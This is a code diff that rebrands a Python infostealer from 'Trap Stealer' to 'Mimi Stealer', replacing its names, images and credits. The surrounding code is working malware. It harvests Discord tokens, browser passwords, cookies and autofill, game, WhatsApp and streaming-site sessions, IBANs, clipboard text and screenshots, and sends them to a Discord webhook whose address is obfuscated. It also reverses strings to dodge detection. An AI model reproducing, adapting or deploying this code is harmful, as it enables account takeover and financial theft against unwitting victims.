@@ -481,19 +481,19 @@ def steal_driver():
                         
                         data = {
                     
-                    "username": "Trap Stealer",
-                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                    "username": "Mimi Stealer",
+                    "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                     "embeds": [
                         {
-                            "title": "🍪 Trap Stealer USB Drivers",
+                            "title": "🍪 Mimi Stealer USB Drivers",
                             "description": f"USB Drivers Files\n{upload}",
                             "color": 0xffb6c1,
                             "thumbnail": {
-                                "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                                "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                             },
                             "footer": {
-                                "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                                "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                                "text": "Mimi Stealer | 💖💖💖",
+                                "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                             }
                         }
                     ]
@@ -537,8 +537,8 @@ def minecraft_sessions():
             else:
                 file_url = upload_file(zip_file_path)
                 data = {
-                        "username": "Trap Stealer",
-                        "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                        "username": "Mimi Stealer",
+                        "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                         "embeds": [
                             {
                                 "title": "Minecraft Session stealer",
@@ -548,11 +548,11 @@ def minecraft_sessions():
                                     {"name": f"Minecraft sessions files", "value": f"[Click here to download]({file_url})"},
                                 ],
                                 "thumbnail": {
-                                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                                    "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                                 },
                                 "footer": {
-                                    "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                                    "text": "Mimi Stealer | 💖💖💖",
+                                    "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                                 }
                             }
                         ]
@@ -609,8 +609,8 @@ def ArchiSteamFarm():
                 else:
                     file_url = upload_file(zip_filename)
                     data = {
-                            "username": "Trap Stealer",
-                            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                            "username": "Mimi Stealer",
+                            "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                             "embeds": [
                                 {
                                     "title": "ArchiSteamFarm Stealer",
@@ -620,11 +620,11 @@ def ArchiSteamFarm():
                                         {"name": f"ArchiSteamFarm file", "value": f"[Click here to download]({file_url})"},
                                     ],
                                     "thumbnail": {
-                                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                                        "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                                     },
                                     "footer": {
-                                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                                        "text": "Mimi Stealer | 💖💖💖",
+                                        "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                                     }
                                 }
                             ]
@@ -1057,7 +1057,7 @@ Autofill = []
 def writeforfile(data, name):
     path = os.getenv("TEMP") + fr"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Trap Stealer\n\n")
+        f.write(f"Mimi Stealer\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -1260,12 +1260,12 @@ def TikTokSession(cookie):
 
 
         data = {
-            "username": "Trap Stealer",
-            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+            "username": "Mimi Stealer",
+            "avatar_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578",
             "content": "",
             "embeds": [
                 {
-                    "title": f"🍪 Trap Stealer Tiktok Session",
+                    "title": f"🍪 Mimi Stealer Tiktok Session",
                     "description": f"Founded user information ! :\n",
                     "color": 0xffb6c1,
                     "author": {
@@ -1273,11 +1273,11 @@ def TikTokSession(cookie):
                         "icon_url": pfp
                     },
                     "footer": {
-                        "text": "Trap Stealer",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        "text": "Mimi Stealer",
+                        "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                     },
                     "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                     },
                     "fields": [
                         {
@@ -1439,8 +1439,8 @@ def trap_exten():
             webhook_url = DeobfuscateWeb(webhookurl[0],webhookurl[1]).decode()
             
             data = {
-                "username":"Trap Stealer",
-                "avatar_url":"https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+                "username":"Mimi Stealer",
+                "avatar_url":"https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578",
 
                 "embeds": [{
                         "title": "IBAN Detected",
@@ -1602,7 +1602,7 @@ def uploadTokq(Tokq, path):
     
     else: 
         processed_id.append(Tokq)
-    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
     back = GetBack()
     billing = GetBilling(Tokq)
     badge = get_badge(flags)
@@ -1626,12 +1626,12 @@ def uploadTokq(Tokq, path):
     tok = 'nekoT'
     em = 'liamE'
     data = {
-        "username": "Trap Stealer",
-        "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+        "username": "Mimi Stealer",
+        "avatar_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578",
         "content": "",
         "embeds": [
             {
-                "title": f"🍪 Trap Stealer {tok[::-1]}",
+                "title": f"🍪 Mimi Stealer {tok[::-1]}",
                 "description": f"`Path` : {path}\n",
                 "color": 0xffb6c1,
                 "author": {
@@ -1639,11 +1639,11 @@ def uploadTokq(Tokq, path):
                     "icon_url": pfp
                 },
                 "footer": {
-                    "text": "Trap Stealer",
-                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                    "text": "Mimi Stealer",
+                    "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                 },
                 "thumbnail": {
-                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                 },
                 "fields": [
                     {
@@ -2013,19 +2013,19 @@ def histup():
         yrk = upload_file(zip_file_name)
         data = {
             
-            "username": "Trap Stealer",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "username": "Mimi Stealer",
+            "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
             "embeds": [
                 {
-                    "title": "🍪 Trap Stealer History",
+                    "title": "🍪 Mimi Stealer History",
                     "description": f"Browser History File\n{yrk}",
                     "color": 0xffb6c1,
                     "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                     },
                     "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        "text": "Mimi Stealer | 💖💖💖",
+                        "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                     }
                 }
             ]
@@ -2145,20 +2145,20 @@ def getinfo():
             useri = useri.result()
 
             data = {
-                "username": "Trap Stealer",
+                "username": "Mimi Stealer",
                 "content": "@everyone someone launched it",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                 "embeds": [
                     {
-                        "title": "🍪 Trap Stealer Information",
+                        "title": "🍪 Mimi Stealer Information",
                         "description": f"{globalinfo}\n\n**👀 Even more information** : \n {sysinfo}\n\n**Startup** : `{StartupMessage}`\nMore Info : `Info.txt` \n[Click here to download]({useri})\nClipboard text : ```{clipboardtext}```",
                         "color": 0xffb6c1,
                         "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                         },
                         "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "text": "Mimi Stealer | 💖💖💖",
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         }
                     }
                 ]
@@ -2198,8 +2198,8 @@ def steam_st():
 
             file = {"file": open(f"{os.environ['TEMP']}\\steam_session.zip", "rb")}
             data = {
-                "username": "Trap Stealer",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "username": "Mimi Stealer",
+                "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                 "content": "Here the Steam Session file"
             }
 
@@ -2257,21 +2257,21 @@ def upload_files_to_discord():
         embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
 
         data = {
-            "username": "Trap Stealer",
+            "username": "Mimi Stealer",
             "content": "",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
             "embeds": [
                 {
-                    "title": "🍪 Trap Stealer Files",
+                    "title": "🍪 Mimi Stealer Files",
                     "description": "New files have been uploaded:",
                     "color": 0xffb6c1,
                     "fields": embed_fields,
                     "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                     },
                     "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        "text": "Mimi Stealer | 💖💖💖",
+                        "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                     }
                 }
             ]
@@ -2409,8 +2409,8 @@ def Upload_Whatsapp():
 
 
         data = {
-                "username": "Trap Stealer",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "username": "Mimi Stealer",
+                "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                 "embeds": [
                     {
                         "title": "🟢 Whatsapp stealer",
@@ -2420,11 +2420,11 @@ def Upload_Whatsapp():
                             {"name": f"WhatsApp file", "value": f"      [Click here to download]({url})"},
                         ],
                         "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                         },
                         "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "text": "Mimi Stealer | 💖💖💖",
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         }
                     }
                 ]
@@ -2558,9 +2558,9 @@ def srcs():
             with open(screenshot_path, "rb") as file:
                 file_data = file.read()
                 data = {
-                    "username": "Trap Stealer",
+                    "username": "Mimi Stealer",
                     "content": "Screen was successfully taken",
-                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+                    "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                 }
                 requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})
 
@@ -2624,12 +2624,12 @@ def paaz(filetype):
             if logfile == True:
                 return
             data = {
-                "username": "Trap Stealer",
+                "username": "Mimi Stealer",
                 "content": "",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                 "embeds": [
                     {
-                        "title": f"🍪 Trap Stealer {'drowssaP'[::-1]} and cookies",
+                        "title": f"🍪 Mimi Stealer {'drowssaP'[::-1]} and cookies",
                         "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {Autofill_count}",
                         "color": 0xffb6c1,
                         "fields": [
@@ -2638,11 +2638,11 @@ def paaz(filetype):
                             {"name": "wpautofill.txt", "value": f"[Click here to download]({url_dict.get('autof', '')})"}
                         ],
                         "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                         },
                         "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "text": "Mimi Stealer | 💖💖💖",
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         }
                     }
                 ]
@@ -2791,20 +2791,20 @@ def roblox(cookie):
         days_passed = round(seconds_passed / (24 * 60 * 60))
 
         data = {
-            "username": "Trap Stealer",
-            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+            "username": "Mimi Stealer",
+            "avatar_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578",
             "content": "",
             "embeds": [
                 {
-                    "title": f"🍪 Trap Stealer Roblox",
+                    "title": f"🍪 Mimi Stealer Roblox",
                     "description": f"Cookie Founded ! : `{cookie}`\n",
                     "color": 0xffb6c1,
                     "author": {
                         "name": f"{username} ({userId})\n",
                     },
                     "footer": {
-                        "text": "Trap Stealer",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        "text": "Mimi Stealer",
+                        "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                     },
                     "thumbnail": {
                         "url": thumbnail 
@@ -2899,7 +2899,7 @@ def guilded(cookie):
             formatted_social_links = 'No Connections'
 
 
-        pfp = response["user"]["profilePicture"] if response["user"]["profilePicture"] else 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
+        pfp = response["user"]["profilePicture"] if response["user"]["profilePicture"] else 'https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578'
         try:
             pfp.replace('.webp', '.png')
             try:
@@ -2920,16 +2920,16 @@ def guilded(cookie):
                 "content": "",
                 "embeds": [
                     {
-                        "title": f"🍪 Trap Stealer Guilded Session",
+                        "title": f"🍪 Mimi Stealer Guilded Session",
                         "description": f"Founded user information ! :\n",
                         "color": 0xffb6c1,
                         "author": {
                             "name": f"User information :",
-                            "icon_url": 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
+                            "icon_url": 'https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578'
                         },
                         "footer": {
                             "text": "Mimi Stealer",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         },
                         "thumbnail": {
                             "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
@@ -3013,7 +3013,7 @@ def patreon(cookie):
         email = response["data"]["attributes"]["email"] if response["data"]["attributes"]["email"] else "Couldn't get creation date"
         verified = '✅' if response["data"]["attributes"]["is_email_verified"] == True else '❌'
         currency = response["data"]["attributes"]["patron_currency"] if response["data"]["attributes"]["patron_currency"] else "Couldn't get currency"
-        image = response["data"]["attributes"]["thumb_url"] if response["data"]["attributes"]["thumb_url"] else "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+        image = response["data"]["attributes"]["thumb_url"] if response["data"]["attributes"]["thumb_url"] else "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
         bio = response["data"]["attributes"]["about"] if response["data"]["attributes"]["about"] else "Couldn't get bio/No bio"
         non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
         url = response["links"]["self"] if response["links"]["self"] else "Couldn't get URL"
@@ -3024,12 +3024,12 @@ def patreon(cookie):
             social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections])
 
         data = {
-                "username": "Trap Stealer",
-                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+                "username": "Mimi Stealer",
+                "avatar_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578",
                 "content": "",
                 "embeds": [
                     {
-                        "title": f"🍪 Trap Stealer Patreon Session",
+                        "title": f"🍪 Mimi Stealer Patreon Session",
                         "description": f"Founded user information ! :\n",
                         "color": 0xffb6c1,
                         "author": {
@@ -3037,11 +3037,11 @@ def patreon(cookie):
                             "icon_url": image
                         },
                         "footer": {
-                            "text": "Trap Stealer",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "text": "Mimi Stealer",
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         },
                         "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                         },
                         "fields": [
                             {
@@ -3143,16 +3143,16 @@ def twitch_session(auth_token, username):
         
         isPartner = 'True' if response["data"]["user"]["isPartner"] == True else "False"
         language = response["data"]["user"]["language"] if response["data"]["user"]["language"] else "Coudn't get language"
-        pfp = response["data"]["user"]["profileImageURL"] if response["data"]["user"]["profileImageURL"] else "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+        pfp = response["data"]["user"]["profileImageURL"] if response["data"]["user"]["profileImageURL"] else "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
         bits = response["data"]["user"]["bitsBalance"] if response["data"]["user"]["bitsBalance"] else "0"
         sub = response["data"]["user"]["followers"]["totalCount"] if response["data"]["user"]["followers"]["totalCount"] else "Coudn't get followers numbers"
         data = {
-            "username": "Trap Stealer",
-            "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+            "username": "Mimi Stealer",
+            "avatar_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578",
             "content": "",
             "embeds": [
                 {
-                    "title": f"🍪 Trap Stealer Twitch Session",
+                    "title": f"🍪 Mimi Stealer Twitch Session",
                     "description": f"Founded user information ! :\n",
                     "color": 0xffb6c1,
                     "author": {
@@ -3160,11 +3160,11 @@ def twitch_session(auth_token, username):
                         "icon_url": pfp
                     },
                     "footer": {
-                        "text": "Trap Stealer",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        "text": "Mimi Stealer",
+                        "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                     },
                     "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                     },
                     "fields": [
                         {
@@ -3251,24 +3251,24 @@ def spotify(cookie):
         date = time.strftime("%Y-%m-%d", time.localtime(timestamp))
 
         data = {
-                "username": "Trap Stealer",
-                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+                "username": "Mimi Stealer",
+                "avatar_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578",
                 "content": "",
                 "embeds": [
                     {
-                        "title": f"🍪 Trap Stealer Spotify Session",
+                        "title": f"🍪 Mimi Stealer Spotify Session",
                         "description": f"Founded user information ! :\n",
                         "color": 0xffb6c1,
                         "author": {
                             "name": f"User information :",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         },
                         "footer": {
-                            "text": "Trap Stealer",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "text": "Mimi Stealer",
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         },
                         "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                         },
                         "fields": [
                             {
@@ -3471,20 +3471,20 @@ def zip_temp_folder():
                         pass
         url = upload_file(zip_file_path)
         data = {
-                "username": "Trap Stealer",
+                "username": "Mimi Stealer",
                 "content": "",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "avatar_url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif",
                 "embeds": [
                     {
-                        "title": f"🍪 Trap Stealer logs",
+                        "title": f"🍪 Mimi Stealer logs",
                         "description": f"Here the logs\n[Click here to download]({url})",
                         "color": 0xffb6c1,
                         "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                         },
                         "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                            "text": "Mimi Stealer | 💖💖💖",
+                            "icon_url": "https://images-ext-1.discordapp.net/external/mkgkjKEHNxYJnhz6BSCqqIXGWlO8WfTxLDehnEBr7us/https/i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg?format=webp&width=581&height=578"
                         }
                     }
                 ]
@@ -3547,16 +3547,16 @@ def GatherZips(paths1, paths2, paths3):
         data = {
                 "embeds": [
                     {
-                        "title": "Trap Stealer Zips",
+                        "title": "Mimi Stealer Zips",
                         "description": f"{wal}\n{ga}\n{ot}",
                         "color": 0xffb6c1,
                         "footer": {
-                            "text": "Trap Stealer ZIP",
+                            "text": "Mimi Stealer ZIP",
